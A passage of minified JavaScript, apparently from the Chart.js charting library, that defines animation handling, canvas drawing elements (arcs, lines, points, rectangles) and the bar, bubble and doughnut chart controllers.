n = +t.right || 0, i = +t.bottom || 0, o = +t.left || 0) : e = n = i = o = +t || 0, { top: e, right: n, bottom: i, left: o, height: e + i, width: o + n } }, _parseFont: function (t) { var e, n = st.global, i = rt(t.fontSize, n.defaultFontSize), o = { family: rt(t.fontFamily, n.defaultFontFamily), lineHeight: P.options.toLineHeight(rt(t.lineHeight, n.defaultLineHeight), i), size: i, style: rt(t.fontStyle, n.defaultFontStyle), weight: null, string: "" }; return o.string = !(e = o) || P.isNullOrUndef(e.size) || P.isNullOrUndef(e.family) ? null : (e.style ? e.style + " " : "") + (e.weight ? e.weight + " " : "") + e.size + "px " + e.family, o }, resolve: function (t, e, n) { for (var i, o = 0, a = t.length; o < a; ++o)if (void 0 !== (i = t[o]) && (void 0 !== e && "function" == typeof i && (i = i(e)), void 0 !== n && P.isArray(i) && (i = i[n]), void 0 !== i)) return i } }, lt = P, ct = ot, It = gt; lt.easing = J, lt.canvas = ct, lt.options = It; function ut(t) { lt.extend(this, t), this.initialize.apply(this, arguments) } lt.extend(ut.prototype, { initialize: function () { this.hidden = !1 }, pivot: function () { return this._view || (this._view = lt.clone(this._model)), this._start = {}, this }, transition: function (t) { var e = this._model, n = this._start, i = this._view; return e && 1 !== t ? (i = i || (this._view = {}), function (t, e, n, i) { for (var o, a, s, r, g, l, c, I = Object.keys(n), u = 0, h = I.length; u < h; ++u)if (r = n[o = I[u]], e.hasOwnProperty(o) || (e[o] = r), (a = e[o]) !== r && "_" !== o[0]) { if (t.hasOwnProperty(o) || (t[o] = a), (g = typeof r) == typeof (s = t[o])) if ("string" == g) { if ((l = M(s)).valid && (c = M(r)).valid) { e[o] = c.mix(l, i).rgbString(); continue } } else if (lt.isFinite(s) && lt.isFinite(r)) { e[o] = s + (r - s) * i; continue } e[o] = r } }(n = n || (this._start = {}), i, e, t)) : (this._view = e, this._start = null), this }, tooltipPosition: function () { return { x: this._model.x, y: this._model.y } }, hasValue: function () { return lt.isNumber(this._model.x) && lt.isNumber(this._model.y) } }), ut.extend = lt.inherits; var ht = ut, dt = ht.extend({ chart: null, currentStep: 0, numSteps: 60, easing: "", render: null, onAnimationProgress: null, onAnimationComplete: null }), Ct = dt; Object.defineProperty(dt.prototype, "animationObject", { get: function () { return this } }), Object.defineProperty(dt.prototype, "chartInstance", { get: function () { return this.chart }, set: function (t) { this.chart = t } }), st._set("global", { animation: { duration: 1e3, easing: "easeOutQuart", onProgress: lt.noop, onComplete: lt.noop } }); var At = { animations: [], request: null, addAnimation: function (t, e, n, i) { var o, a, s = this.animations; for (e.chart = t, e.startTime = Date.now(), e.duration = n, i || (t.animating = !0), o = 0, a = s.length; o < a; ++o)if (s[o].chart === t) return void (s[o] = e); s.push(e), 1 === s.length && this.requestAnimationFrame() }, cancelAnimation: function (e) { var t = lt.findIndex(this.animations, function (t) { return t.chart === e }); -1 !== t && (this.animations.splice(t, 1), e.animating = !1) }, requestAnimationFrame: function () { var t = this; null === t.request && (t.request = lt.requestAnimFrame.call(window, function () { t.request = null, t.startDigest() })) }, startDigest: function () { this.advance(), 0 < this.animations.length && this.requestAnimationFrame() }, advance: function () { for (var t, e, n, i, o = this.animations, a = 0; a < o.length;)e = (t = o[a]).chart, n = t.numSteps, i = Math.floor((Date.now() - t.startTime) / t.duration * n) + 1, t.currentStep = Math.min(i, n), lt.callback(t.render, [e, t], e), lt.callback(t.onAnimationProgress, [t], e), t.currentStep >= n ? (lt.callback(t.onAnimationComplete, [t], e), e.animating = !1, o.splice(a, 1)) : ++a } }, pt = lt.options.resolve, mt = ["push", "pop", "shift", "splice", "unshift"]; function ft(e, t) { var n, i, o = e._chartjs; o && (-1 !== (i = (n = o.listeners).indexOf(t)) && n.splice(i, 1), 0 < n.length || (mt.forEach(function (t) { delete e[t] }), delete e._chartjs)) } function bt(t, e) { this.initialize(t, e) } lt.extend(bt.prototype, { datasetElementType: null, dataElementType: null, initialize: function (t, e) { this.chart = t, this.index = e, this.linkScales(), this.addElements() }, updateIndex: function (t) { this.index = t }, linkScales: function () { var t = this.getMeta(), e = this.getDataset(); null !== t.xAxisID && t.xAxisID in this.chart.scales || (t.xAxisID = e.xAxisID || this.chart.options.scales.xAxes[0].id), null !== t.yAxisID && t.yAxisID in this.chart.scales || (t.yAxisID = e.yAxisID || this.chart.options.scales.yAxes[0].id) }, getDataset: function () { return this.chart.data.datasets[this.index] }, getMeta: function () { return this.chart.getDatasetMeta(this.index) }, getScaleForId: function (t) { return this.chart.scales[t] }, _getValueScaleId: function () { return this.getMeta().yAxisID }, _getIndexScaleId: function () { return this.getMeta().xAxisID }, _getValueScale: function () { return this.getScaleForId(this._getValueScaleId()) }, _getIndexScale: function () { return this.getScaleForId(this._getIndexScaleId()) }, reset: function () { this.update(!0) }, destroy: function () { this._data && ft(this._data, this) }, createMetaDataset: function () { var t = this.datasetElementType; return t && new t({ _chart: this.chart, _datasetIndex: this.index }) }, createMetaData: function (t) { var e = this.dataElementType; return e && new e({ _chart: this.chart, _datasetIndex: this.index, _index: t }) }, addElements: function () { for (var t = this.getMeta(), e = this.getDataset().data || [], n = t.data, i = 0, o = e.length; i < o; ++i)n[i] = n[i] || this.createMetaData(i); t.dataset = t.dataset || this.createMetaDataset() }, addElementAndReset: function (t) { var e = this.createMetaData(t); this.getMeta().data.splice(t, 0, e), this.updateElement(e, t, !0) }, buildOrUpdateElements: function () { var o, t, e = this.getDataset(), n = e.data || (e.data = []); this._data !== n && (this._data && ft(this._data, this), n && Object.isExtensible(n) && (t = this, (o = n)._chartjs ? o._chartjs.listeners.push(t) : (Object.defineProperty(o, "_chartjs", { configurable: !0, enumerable: !1, value: { listeners: [t] } }), mt.forEach(function (t) { var n = "onData" + t.charAt(0).toUpperCase() + t.slice(1), i = o[t]; Object.defineProperty(o, t, { configurable: !0, enumerable: !1, value: function () { var e = Array.prototype.slice.call(arguments), t = i.apply(this, e); return lt.each(o._chartjs.listeners, function (t) { "function" == typeof t[n] && t[n].apply(t, e) }), t } }) }))), this._data = n), this.resyncElements() }, update: lt.noop, transition: function (t) { for (var e = this.getMeta(), n = e.data || [], i = n.length, o = 0; o < i; ++o)n[o].transition(t); e.dataset && e.dataset.transition(t) }, draw: function () { var t = this.getMeta(), e = t.data || [], n = e.length, i = 0; for (t.dataset && t.dataset.draw(); i < n; ++i)e[i].draw() }, removeHoverStyle: function (t) { lt.merge(t._model, t.$previousStyle || {}), delete t.$previousStyle }, setHoverStyle: function (t) { var e = this.chart.data.datasets[t._datasetIndex], n = t._index, i = t.custom || {}, o = t._model, a = lt.getHoverColor; t.$previousStyle = { backgroundColor: o.backgroundColor, borderColor: o.borderColor, borderWidth: o.borderWidth }, o.backgroundColor = pt([i.hoverBackgroundColor, e.hoverBackgroundColor, a(o.backgroundColor)], void 0, n), o.borderColor = pt([i.hoverBorderColor, e.hoverBorderColor, a(o.borderColor)], void 0, n), o.borderWidth = pt([i.hoverBorderWidth, e.hoverBorderWidth, o.borderWidth], void 0, n) }, resyncElements: function () { var t = this.getMeta(), e = this.getDataset().data, n = t.data.length, i = e.length; i < n ? t.data.splice(i, n - i) : n < i && this.insertElements(n, i - n) }, insertElements: function (t, e) { for (var n = 0; n < e; ++n)this.addElementAndReset(t + n) }, onDataPush: function () { var t = arguments.length; this.insertElements(this.getDataset().data.length - t, t) }, onDataPop: function () { this.getMeta().data.pop() }, onDataShift: function () { this.getMeta().data.shift() }, onDataSplice: function (t, e) { this.getMeta().data.splice(t, e), this.insertElements(t, arguments.length - 2) }, onDataUnshift: function () { this.insertElements(0, arguments.length) } }), bt.extend = lt.inherits; var Bt = bt; st._set("global", { elements: { arc: { backgroundColor: st.global.defaultColor, borderColor: "#fff", borderWidth: 2, borderAlign: "center" } } }); var yt = ht.extend({ inLabelRange: function (t) { var e = this._view; return !!e && Math.pow(t - e.x, 2) < Math.pow(e.radius + e.hoverRadius, 2) }, inRange: function (t, e) { var n = this._view; if (n) { for (var i = lt.getAngleFromPoint(n, { x: t, y: e }), o = i.angle, a = i.distance, s = n.startAngle, r = n.endAngle; r < s;)r += 2 * Math.PI; for (; r < o;)o -= 2 * Math.PI; for (; o < s;)o += 2 * Math.PI; var g = s <= o && o <= r, l = a >= n.innerRadius && a <= n.outerRadius; return g && l } return !1 }, getCenterPoint: function () { var t = this._view, e = (t.startAngle + t.endAngle) / 2, n = (t.innerRadius + t.outerRadius) / 2; return { x: t.x + Math.cos(e) * n, y: t.y + Math.sin(e) * n } }, getArea: function () { var t = this._view; return Math.PI * ((t.endAngle - t.startAngle) / (2 * Math.PI)) * (Math.pow(t.outerRadius, 2) - Math.pow(t.innerRadius, 2)) }, tooltipPosition: function () { var t = this._view, e = t.startAngle + (t.endAngle - t.startAngle) / 2, n = (t.outerRadius - t.innerRadius) / 2 + t.innerRadius; return { x: t.x + Math.cos(e) * n, y: t.y + Math.sin(e) * n } }, draw: function () { var t, e = this._chart.ctx, n = this._view, i = n.startAngle, o = n.endAngle, a = "inner" === n.borderAlign ? .33 : 0; e.save(), e.beginPath(), e.arc(n.x, n.y, Math.max(n.outerRadius - a, 0), i, o), e.arc(n.x, n.y, n.innerRadius, o, i, !0), e.closePath(), e.fillStyle = n.backgroundColor, e.fill(), n.borderWidth && ("inner" === n.borderAlign ? (e.beginPath(), t = a / n.outerRadius, e.arc(n.x, n.y, n.outerRadius, i - t, o + t), n.innerRadius > a ? (t = a / n.innerRadius, e.arc(n.x, n.y, n.innerRadius - a, o + t, i - t, !0)) : e.arc(n.x, n.y, a, o + Math.PI / 2, i - Math.PI / 2), e.closePath(), e.clip(), e.beginPath(), e.arc(n.x, n.y, n.outerRadius, i, o), e.arc(n.x, n.y, n.innerRadius, o, i, !0), e.closePath(), e.lineWidth = 2 * n.borderWidth, e.lineJoin = "round") : (e.lineWidth = n.borderWidth, e.lineJoin = "bevel"), e.strokeStyle = n.borderColor, e.stroke()), e.restore() } }), vt = lt.valueOrDefault, xt = st.global.defaultColor; st._set("global", { elements: { line: { tension: .4, backgroundColor: xt, borderWidth: 3, borderColor: xt, borderCapStyle: "butt", borderDash: [], borderDashOffset: 0, borderJoinStyle: "miter", capBezierPoints: !0, fill: !0 } } }); var Ft = ht.extend({ draw: function () { var t, e, n, i, o = this._view, a = this._chart.ctx, s = o.spanGaps, r = this._children.slice(), g = st.global, l = g.elements.line, c = -1; for (this._loop && r.length && r.push(r[0]), a.save(), a.lineCap = o.borderCapStyle || l.borderCapStyle, a.setLineDash && a.setLineDash(o.borderDash || l.borderDash), a.lineDashOffset = vt(o.borderDashOffset, l.borderDashOffset), a.lineJoin = o.borderJoinStyle || l.borderJoinStyle, a.lineWidth = vt(o.borderWidth, l.borderWidth), a.strokeStyle = o.borderColor || g.defaultColor, a.beginPath(), c = -1, t = 0; t < r.length; ++t)e = r[t], n = lt.previousItem(r, t), i = e._view, 0 === t ? i.skip || (a.moveTo(i.x, i.y), c = t) : (n = -1 === c ? n : r[c], i.skip || (c !== t - 1 && !s || -1 === c ? a.moveTo(i.x, i.y) : lt.canvas.lineTo(a, n._view, e._view), c = t)); a.stroke(), a.restore() } }), Qt = lt.valueOrDefault, Gt = st.global.defaultColor; function wt(t) { var e = this._view; return !!e && Math.abs(t - e.x) < e.radius + e.hitRadius } st._set("global", { elements: { point: { radius: 3, pointStyle: "circle", backgroundColor: Gt, borderColor: Gt, borderWidth: 1, hitRadius: 1, hoverRadius: 4, hoverBorderWidth: 1 } } }); var Xt = ht.extend({ inRange: function (t, e) { var n = this._view; return !!n && Math.pow(t - n.x, 2) + Math.pow(e - n.y, 2) < Math.pow(n.hitRadius + n.radius, 2) }, inLabelRange: wt, inXRange: wt, inYRange: function (t) { var e = this._view; return !!e && Math.abs(t - e.y) < e.radius + e.hitRadius }, getCenterPoint: function () { var t = this._view; return { x: t.x, y: t.y } }, getArea: function () { return Math.PI * Math.pow(this._view.radius, 2) }, tooltipPosition: function () { var t = this._view; return { x: t.x, y: t.y, padding: t.radius + t.borderWidth } }, draw: function (t) { var e = this._view, n = this._chart.ctx, i = e.pointStyle, o = e.rotation, a = e.radius, s = e.x, r = e.y, g = st.global, l = g.defaultColor; e.skip || void 0 !== t && !lt.canvas._isPointInArea(e, t) || (n.strokeStyle = e.borderColor || l, n.lineWidth = Qt(e.borderWidth, g.elements.point.borderWidth), n.fillStyle = e.backgroundColor || l, lt.canvas.drawPoint(n, i, a, s, r, o)) } }), St = st.global.defaultColor; function kt(t) { return t && void 0 !== t.width } function Dt(t) { var e, n, i, o, a = kt(t) ? (o = t.width / 2, e = t.x - o, n = t.x + o, i = Math.min(t.y, t.base), Math.max(t.y, t.base)) : (o = t.height / 2, e = Math.min(t.x, t.base), n = Math.max(t.x, t.base), i = t.y - o, t.y + o); return { left: e, top: i, right: n, bottom: a } } function Zt(t, e, n) { return t === e ? n : t === n ? e : t } function Ut(t, e, n) { var i, o, a, s, r, g, l, c = t.borderWidth, I = (o = (i = t).borderSkipped, a = {}, o && (i.horizontal ? i.base > i.x && (o = Zt(o, "left", "right")) : i.base < i.y && (o = Zt(o, "bottom", "top")), a[o] = !0), a); return lt.isObject(c) ? (s = +c.top || 0, r = +c.right || 0, g = +c.bottom || 0, l = +c.left || 0) : s = r = g = l = +c || 0, { t: I.top || s < 0 ? 0 : n < s ? n : s, r: I.right || r < 0 ? 0 : e < r ? e : r, b: I.bottom || g < 0 ? 0 : n < g ? n : g, l: I.left || l < 0 ? 0 : e < l ? e : l } } function Wt(t, e, n) { var i = null === e, o = null === n, a = !(!t || i && o) && Dt(t); return a && (i || e >= a.left && e <= a.right) && (o || n >= a.top && n <= a.bottom) } st._set("global", { elements: { rectangle: { backgroundColor: St, borderColor: St, borderSkipped: "bottom", borderWidth: 0 } } }); var Nt = ht.extend({ draw: function () { var t, e, n, i, o, a = this._chart.ctx, s = this._view, r = (e = Dt(t = s), n = e.right - e.left, i = e.bottom - e.top, o = Ut(t, n / 2, i / 2), { outer: { x: e.left, y: e.top, w: n, h: i }, inner: { x: e.left + o.l, y: e.top + o.t, w: n - o.l - o.r, h: i - o.t - o.b } }), g = r.outer, l = r.inner; a.fillStyle = s.backgroundColor, a.fillRect(g.x, g.y, g.w, g.h), g.w === l.w && g.h === l.h || (a.save(), a.beginPath(), a.rect(g.x, g.y, g.w, g.h), a.clip(), a.fillStyle = s.borderColor, a.rect(l.x, l.y, l.w, l.h), a.fill("evenodd"), a.restore()) }, height: function () { var t = this._view; return t.base - t.y }, inRange: function (t, e) { return Wt(this._view, t, e) }, inLabelRange: function (t, e) { var n = this._view; return kt(n) ? Wt(n, t, null) : Wt(n, null, e) }, inXRange: function (t) { return Wt(this._view, t, null) }, inYRange: function (t) { return Wt(this._view, null, t) }, getCenterPoint: function () { var t, e = this._view, n = kt(e) ? (t = e.x, (e.y + e.base) / 2) : (t = (e.x + e.base) / 2, e.y); return { x: t, y: n } }, getArea: function () { var t = this._view; return kt(t) ? t.width * Math.abs(t.y - t.base) : t.height * Math.abs(t.x - t.base) }, tooltipPosition: function () { var t = this._view; return { x: t.x, y: t.y } } }), Tt = {}, Ht = Ft, Et = Xt, Rt = Nt; Tt.Arc = yt, Tt.Line = Ht, Tt.Point = Et, Tt.Rectangle = Rt; var Yt = lt.options.resolve; st._set("bar", { hover: { mode: "label" }, scales: { xAxes: [{ type: "category", categoryPercentage: .8, barPercentage: .9, offset: !0, gridLines: { offsetGridLines: !0 } }], yAxes: [{ type: "linear" }] } }); var Ot = Bt.extend({ dataElementType: Tt.Rectangle, initialize: function () { var t; Bt.prototype.initialize.apply(this, arguments), (t = this.getMeta()).stack = this.getDataset().stack, t.bar = !0 }, update: function (t) { var e, n, i = this.getMeta().data; for (this._ruler = this.getRuler(), e = 0, n = i.length; e < n; ++e)this.updateElement(i[e], e, t) }, updateElement: function (t, e, n) { var i = this.getMeta(), o = this.getDataset(), a = this._resolveElementOptions(t, e); t._xScale = this.getScaleForId(i.xAxisID), t._yScale = this.getScaleForId(i.yAxisID), t._datasetIndex = this.index, t._index = e, t._model = { backgroundColor: a.backgroundColor, borderColor: a.borderColor, borderSkipped: a.borderSkipped, borderWidth: a.borderWidth, datasetLabel: o.label, label: this.chart.data.labels[e] }, this._updateElementGeometry(t, e, n), t.pivot() }, _updateElementGeometry: function (t, e, n) { var i = t._model, o = this._getValueScale(), a = o.getBasePixel(), s = o.isHorizontal(), r = this._ruler || this.getRuler(), g = this.calculateBarValuePixels(this.index, e), l = this.calculateBarIndexPixels(this.index, e, r); i.horizontal = s, i.base = n ? a : g.base, i.x = s ? n ? a : g.head : l.center, i.y = s ? l.center : n ? a : g.head, i.height = s ? l.size : void 0, i.width = s ? void 0 : l.size }, _getStacks: function (t) { for (var e, n = this.chart, i = this._getIndexScale().options.stacked, o = void 0 === t ? n.data.datasets.length : t + 1, a = [], s = 0; s < o; ++s)(e = n.getDatasetMeta(s)).bar && n.isDatasetVisible(s) && (!1 === i || !0 === i && -1 === a.indexOf(e.stack) || void 0 === i && (void 0 === e.stack || -1 === a.indexOf(e.stack))) && a.push(e.stack); return a }, getStackCount: function () { return this._getStacks().length }, getStackIndex: function (t, e) { var n = this._getStacks(t), i = void 0 !== e ? n.indexOf(e) : -1; return -1 === i ? n.length - 1 : i }, getRuler: function () { for (var t = this._getIndexScale(), e = this.getStackCount(), n = this.index, i = t.isHorizontal(), o = i ? t.left : t.top, a = o + (i ? t.width : t.height), s = [], r = 0, g = this.getMeta().data.length; r < g; ++r)s.push(t.getPixelForValue(null, r, n)); return { min: lt.isNullOrUndef(t.options.barThickness) ? function (t, e) { for (var n, i, o = t.isHorizontal() ? t.width : t.height, a = t.getTicks(), s = 1, r = e.length; s < r; ++s)o = Math.min(o, Math.abs(e[s] - e[s - 1])); for (s = 0, r = a.length; s < r; ++s)i = t.getPixelForTick(s), o = 0 < s ? Math.min(o, i - n) : o, n = i; return o }(t, s) : -1, pixels: s, start: o, end: a, stackCount: e, scale: t } }, calculateBarValuePixels: function (t, e) { var n, i, o, a, s, r, g = this.chart, l = this.getMeta(), c = this._getValueScale(), I = c.isHorizontal(), u = g.data.datasets, h = +c.getRightValue(u[t].data[e]), d = c.options.minBarLength, C = c.options.stacked, A = l.stack, p = 0; if (C || void 0 === C && void 0 !== A) for (n = 0; n < t; ++n)(i = g.getDatasetMeta(n)).bar && i.stack === A && i.controller._getValueScaleId() === c.id && g.isDatasetVisible(n) && (o = +c.getRightValue(u[n].data[e]), (h < 0 && o < 0 || 0 <= h && 0 < o) && (p += o)); return a = c.getPixelForValue(p), r = (s = c.getPixelForValue(p + h)) - a, void 0 !== d && Math.abs(r) < d && (r = d, s = 0 <= h && !I || h < 0 && I ? a - d : a + d), { size: r, base: a, head: s, center: s + r / 2 } }, calculateBarIndexPixels: function (t, e, n) { var i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b = n.scale.options, B = "flex" === b.barThickness ? (I = e, h = b, C = (u = n).pixels, A = C[I], p = 0 < I ? C[I - 1] : null, m = I < C.length - 1 ? C[I + 1] : null, f = h.categoryPercentage, null === p && (p = A - (null === m ? u.end - u.start : m - A)), null === m && (m = A + A - p), d = A - (A - Math.min(p, m)) / 2 * f, { chunk: Math.abs(m - p) / 2 * f / u.stackCount, ratio: h.barPercentage, start: d }) : (i = e, o = n, r = (a = b).barThickness, g = o.stackCount, l = o.pixels[i], c = lt.isNullOrUndef(r) ? (s = o.min * a.categoryPercentage, a.barPercentage) : (s = r * g, 1), { chunk: s / g, ratio: c, start: l - s / 2 }), y = this.getStackIndex(t, this.getMeta().stack), v = B.start + B.chunk * y + B.chunk / 2, x = Math.min(lt.valueOrDefault(b.maxBarThickness, 1 / 0), B.chunk * B.ratio); return { base: v - x / 2, head: v + x / 2, center: v, size: x } }, draw: function () { var t = this.chart, e = this._getValueScale(), n = this.getMeta().data, i = this.getDataset(), o = n.length, a = 0; for (lt.canvas.clipArea(t.ctx, t.chartArea); a < o; ++a)isNaN(e.getRightValue(i.data[a])) || n[a].draw(); lt.canvas.unclipArea(t.ctx) }, _resolveElementOptions: function (t, e) { for (var n, i = this.chart, o = i.data.datasets[this.index], a = t.custom || {}, s = i.options.elements.rectangle, r = {}, g = { chart: i, dataIndex: e, dataset: o, datasetIndex: this.index }, l = ["backgroundColor", "borderColor", "borderSkipped", "borderWidth"], c = 0, I = l.length; c < I; ++c)r[n = l[c]] = Yt([a[n], o[n], s[n]], g, e); return r } }), _t = lt.valueOrDefault, Vt = lt.options.resolve; st._set("bubble", { hover: { mode: "single" }, scales: { xAxes: [{ type: "linear", position: "bottom", id: "x-axis-0" }], yAxes: [{ type: "linear", position: "left", id: "y-axis-0" }] }, tooltips: { callbacks: { title: function () { return "" }, label: function (t, e) { var n = e.datasets[t.datasetIndex].label || "", i = e.datasets[t.datasetIndex].data[t.index]; return n + ": (" + t.xLabel + ", " + t.yLabel + ", " + i.r + ")" } } } }); var Lt = Bt.extend({ dataElementType: Tt.Point, update: function (n) { var i = this, t = i.getMeta().data; lt.each(t, function (t, e) { i.updateElement(t, e, n) }) }, updateElement: function (t, e, n) { var i = this.getMeta(), o = t.custom || {}, a = this.getScaleForId(i.xAxisID), s = this.getScaleForId(i.yAxisID), r = this._resolveElementOptions(t, e), g = this.getDataset().data[e], l = this.index, c = n ? a.getPixelForDecimal(.5) : a.getPixelForValue("object" == typeof g ? g : NaN, e, l), I = n ? s.getBasePixel() : s.getPixelForValue(g, e, l); t._xScale = a, t._yScale = s, t._options = r, t._datasetIndex = l, t._index = e, t._model = { backgroundColor: r.backgroundColor, borderColor: r.borderColor, borderWidth: r.borderWidth, hitRadius: r.hitRadius, pointStyle: r.pointStyle, rotation: r.rotation, radius: n ? 0 : r.radius, skip: o.skip || isNaN(c) || isNaN(I), x: c, y: I }, t.pivot() }, setHoverStyle: function (t) { var e = t._model, n = t._options, i = lt.getHoverColor; t.$previousStyle = { backgroundColor: e.backgroundColor, borderColor: e.borderColor, borderWidth: e.borderWidth, radius: e.radius }, e.backgroundColor = _t(n.hoverBackgroundColor, i(n.backgroundColor)), e.borderColor = _t(n.hoverBorderColor, i(n.borderColor)), e.borderWidth = _t(n.hoverBorderWidth, n.borderWidth), e.radius = n.radius + n.hoverRadius }, _resolveElementOptions: function (t, e) { for (var n, i = this.chart, o = i.data.datasets[this.index], a = t.custom || {}, s = i.options.elements.point, r = o.data[e], g = {}, l = { chart: i, dataIndex: e, dataset: o, datasetIndex: this.index }, c = ["backgroundColor", "borderColor", "borderWidth", "hoverBackgroundColor", "hoverBorderColor", "hoverBorderWidth", "hoverRadius", "hitRadius", "pointStyle", "rotation"], I = 0, u = c.length; I < u; ++I)g[n = c[I]] = Vt([a[n], o[n], s[n]], l, e); return g.radius = Vt([a.radius, r ? r.r : void 0, o.radius, s.radius], l, e), g } }), Mt = lt.options.resolve, zt = lt.valueOrDefault; st._set("doughnut", { animation: { animateRotate: !0, animateScale: !1 }, hover: { mode: "single" }, legendCallback: function (t) { var e = []; e.push('<ul class="' + t.id + '-legend">'); var n = t.data, i = n.datasets, o = n.labels; if (i.length) for (var a = 0; a < i[0].data.length; ++a)e.push('<li><span style="background-color:' + i[0].backgroundColor[a] + '"></span>'), o[a] && e.push(o[a]), e.push("</li>"); return e.push("</ul>"), e.join("") }, legend: { labels: { generateLabels: function (r) { var g = r.data; return g.labels.length && g.datasets.length ? g.labels.map(function (t, e) { var n = r.getDatasetMeta(0), i = g.datasets[0], o = n.data[e], a = o && o.custom || {}, s = r.options.elements.arc; return { text: t, fillStyle: Mt([a.backgroundColor, i.backgroundColor, s.backgroundColor], void 0, e), strokeStyle: Mt([a.borderColor, i.borderColor, s.borderColor], void 0, e), lineWidth: Mt([a.borderWidth, i.borderWidth, s.borderWidth], void 0, e), hidden: isNaN(i.data[e]) || n.data[e].hidden, index: e } }) : [] } }, onClick: function (t, e) { for (var n, i = e.index, o = this.chart, a = 0, s = (o.data.datasets || []).length; a < s; ++a)(n = o.getDatasetMeta(a)).data[i] && (n.data[i].hidden = !n.data[i].hidden); o.update() } }, cutoutPercentage: 50, rotation: -.5 * Math.PI, circumference: 2 * Math.PI, tooltips: { callbacks: { title: function () { return "" }, label: function (t, e) { var n = e.labels[t.index], i = ": " + e.datasets[t.datasetIndex].data[t.index]; return lt.isArray(n) ? (n = n.slice())[0] += i : n += i, n } } } }); var Pt = Bt.extend({ dataElementType: Tt.Arc, linkScales: lt.noop, getRingIndex: function (t) { for (var e = 0, n = 0; n < t; ++n)this.chart.isDatasetVisible(n) && ++e; return e }, update: function (t) { var e, n, i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b = this, B = b.chart, y = B.chartArea, v = B.options, x = y.right - y.left, F = y.bottom - y.top, Q = Math.min(x, F), G = { x: 0, y: 0 }, w = b.getMeta(), X = w.data, S = v.cutoutPercentage, k = v.circumference, D = b._getRingWeight(b.index); for (k < 2 * Math.PI && (i = v.rotation % (2 * Math.PI), o = (i += 2 * Math.PI * (i >= Math.PI ? -1 : i < -Math.PI ? 1 : 0)) + k, a = Math.cos(i), s = Math.sin(i), r = Math.cos(o), g = Math.sin(o), l = i <= 0 && 0 <= o || i <= 2 * Math.PI && 2 * Math.PI <= o, c = i <= .5 * Math.PI && .5 * Math.PI <= o || i <= 2.5 * Math.PI && 2.5 * Math.PI <= o, I = i <= -Math.PI && -Math.PI <= o || i <= Math.PI && Math.PI <= o, u = i <= .5 * -Math.PI && .5 * -Math.PI <= o || i <= 1.5 * Math.PI && 1.5 * Math.PI <= o, h = S / 100, d = I ? -1 : Math.min(a * (a < 0 ? 1 : h), r * (r < 0 ? 1 : h)), C = u ? -1 : Math.min(s * (s < 0 ? 1 : h), g * (g < 0 ? 1 : h)), m = .5 * ((A = l ? 1 : Math.max(a * (0 < a ? 1 : h), r * (0 < r ? 1 : h))) - d), f = .5 * ((p = c ? 1 : Math.max(s * (0 < s ? 1 : h), g * (0 < g ? 1 : h))) - C), Q = Math.min(x / m, F / f), G = { x: -.5 * (A + d), y: -.5 * (p + C) }), e = 0, n = X.length; e < n; ++e)X[e]._options = b._resolveElementOptions(X[e], e); for (B.borderWidth = b.getMaxBorderWidth(), B.outerRadius = Math.max((Q - B.borderWidth) / 2, 0), B.innerRadius = Math.max(S ? B.outerRadius / 100 * S : 0, 0), B.radiusLength = (B.outerRadius - B.innerRadius) / (b._getVisibleDatasetWeightTotal() || 1), B.offsetX = G.x * B.outerRadius, B.offsetY = G.y * B.outerRadius, w.total = b.calculateTotal(), b.outerRadius = B.outerRadius - B.radiusLength * b._getRingWeightOffset(b.index), b.innerRadius = Math.max(b.outerRadius - B.radiusLength * D, 0), e = 0, n = X.length; e < n; ++e)b.updateElement(X[e], e, t) }, updateElement: function (t, e, n) { var i = this.chart, o = i.chartArea, a = i.options, s = a.animation, r = (o.left + o.right) / 2, g = (o.top + o.bottom) / 2, l = a.rotation, c = a.rotation, I = this.getDataset(), u = n && s.animateRotate || t.hidden ? 0 : this.calculateCircumference(I.data[e]) * (a.circumference / (2 * Math.PI)), h = n && s.animateScale ? 0 : this.innerRadius, d = n && s.animateScale ? 0 : this.outerRadius, C = t._options || {}; lt.extend(t, { _datasetIndex: this.index, _index: e, _model: { backgroundColor: C.backgroundColor, borderColor: C.borderColor, borderWidth: C.borderWidth, borderAlign: C.borderAlign, x: r + i.offsetX, y: g + i.offsetY, startAngle: l, endAngle: c, circumference: u, outerRadius: d, innerRadius: h, label: lt.valueAtIndexOrDefault(I.label, e, i.data.labels[e]) } }); var A = t._model; n && s.animateRotate || (A.startAngle = 0 === e ? a.rotation : this.getMeta().data[e - 1]._model.endAngle, A.endAngle = A.startAngle + A.circumference), t.pivot() }, calculateTotal: function () { var n, i = this.getDataset(), t = this.getMeta(), o = 0; return lt.each(t.data, function (t, e) { n = i.data[e], isNaN(n) || t.hidden || (o += Math.abs(n)) }), o }, calculateCircumference: function (t) { var e = this.getMeta().total; return 0 < e && !isNaN(t) ? 2 * Math.PI * (Math.abs(t) / e) : 0 }, getMaxBorderWidth: function (t) { var e, n, i, o, a, s, r, g, l = 0, c = this.chart; if (!t) for (e = 0, n = c.data.datasets.length; e < n; ++e)if (c.isDatasetVisible(e)) { t = (i = c.getDatasetMeta(e)).data, e !== this.index && (a = i.controller); break } if (!t) return 0; for (e = 0, n = t.length; e < n; ++e)o = t[e], "inner" !== (s = a ? a._resolveElementOptions(o, e) : o._options).borderAlign && (l = (l = l < (r = s.borderWidth) ? r : l) < (g = s.hoverBorderWidth) ? g : l); return l }, setHoverStyle: function (t) { var e = t._model, n = t._options, i = lt.getHoverColor; t.$previousStyle = { backgroundColor: e.backgroundColor, borderColor: e.borderColor, borderWidth: e.borderWidth }, e.backgroundColor = zt(n.hoverBackgroundColor, i(n.backgroundColor)), e.borderColor = zt(n.hoverBorderColor, i(n.borderColor)), e.borderWidth = zt(n.hoverBorderWidth, n.borderWidth) }, _resolveElementOptions: function (t, e) { for (var n, i = this.chart, o = this.getDataset(), a = t.custom || {}, s = i.options.elements.arc, r = {}, g = { chart: i, dataIndex: e, dataset: o, datasetIndex: this.index }, l = ["backgroundColor", "borderColor", "borderWidth", "borderAlign", "hoverBackgroundColor", "hoverBorderColor", "hoverBorderWidth"], c = 0, I = l.length; c < I; ++c)r[n = l[c]] = Mt([a[n], o[n], s[n]], g, e); return r }, _getRingWeightOffset: function (t) { for (var e = 0, n = 0; n < t; ++n)this.chart.isDatasetVisible(n) && (e += this._getRingWeight(n)); return e }, _getRingWeight: function (t) { return Math.max(zt(this.chart.data.datasets[t].weight, 1), 0) }, _getVisibleDatasetWeightTotal: function () { return this._getRingWeightOffset(this.chart.data.datasets.length) } }); st._set("horizontalBar", { hover: { mode: "index", axis: "y" }, scales: { xAxes: [{ type: "linear", position: "bottom" }], yAxes: 